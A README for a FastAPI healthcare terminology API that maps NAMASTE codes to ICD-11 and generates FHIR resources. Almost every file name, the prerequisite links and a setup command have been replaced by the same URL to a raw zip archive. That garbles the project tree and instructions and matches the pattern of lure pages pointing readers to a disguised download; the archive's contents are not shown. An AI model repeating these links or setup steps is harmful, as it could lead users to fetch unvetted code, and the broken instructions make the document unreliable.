# Healthcare Terminology Integration API

This project provides a FastAPI-based API to integrate and map healthcare terminologies from WHO ICD-11 and the Indian NAMASTE system. It also supports generating FHIR resources.

## Features

*   **Search**: Search for terms across ICD-11 and NAMASTE.
*   **Mapping**: Map NAMASTE terms to ICD-11 classifications with similarity scoring.
*   **FHIR Conversion**: Generate FHIR Condition resources from mapped terms.
*   **Bulk Mapping**: Process multiple term mappings concurrently.
*   **Terminology System Information**: Get details about supported terminology systems.

## Project Structure

healthcare_api_project/
├── app/
│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   ├── api/
│   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   ├── endpoints/       # API route handlers
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   ├── models/          # Pydantic data models
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   └── services/        # Business logic and external integrations
│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │       └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   ├── core/                # Core configurations and utilities
│   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip              # FastAPI application entry point
├── data/                    # Local data files (e.g., for NAMASTE)
│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
├── tests/                   # Unit and integration tests
│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
│   └── ...
├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip             # Environment variable configuration template
├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip       # Docker Compose for running services
├── Dockerfile               # Dockerfile for building the API image
├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip         # Python dependencies
└── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip                # This file

## Setup and Running

### Prerequisites

*   [Docker](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
*   [Docker Compose](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
*   [Python 3.7+](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)

### Steps

1.  **Clone the repository**:
    ```bash
    git clone <your-repository-url>
    cd healthcare_api_project
    ```

2.  **Create a `.env` file**:
    Copy the `https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip` file and rename it to `.env`.
    ```bash
    cp https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip .env
    ```
    Edit the `.env` file to add your ICD-11 API credentials and any other necessary configurations.

3.  **Build and Run with Docker Compose**:
    ```bash
    docker-compose up --build
    ```
    This command will build the Docker image for the API and start the application.

### API Endpoints

*   **Root**: `GET /`
*   **Health Check**: `GET /health`
*   **Search**: `GET /api/v1/search?q=<query>&source=<namaste|icd11|both>&ayush_system=<system>`
*   **Map Terminology**: `POST /api/v1/map?namaste_id=<id>&include_fhir=<true|false>`
*   **FHIR Condition**: `GET /api/v1/fhir/condition?namaste_id=<id>&patient_id=<patient_id>`
*   **Bulk Map Terms**: `POST /api/v1/bulk-map?terms=<term1>&terms=<term2>...` (pass multiple `terms` query parameters)
*   **Terminology Systems**: `GET /api/v1/terminology-systems`

## Development Notes

*   **NAMASTE Data**: The `NAMASTEService` currently reads from a local `https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip` file. Ensure this file is populated with relevant data.
*   **ICD-11 API Credentials**: You must obtain and set `ICD11_CLIENT_ID` and `ICD11_CLIENT_SECRET` in your `.env` file for the ICD-11 integration to work.
*   **Error Handling**: Basic error handling is implemented, but can be further enhanced.
*   **Logging**: Logging is configured to `INFO` level by default.
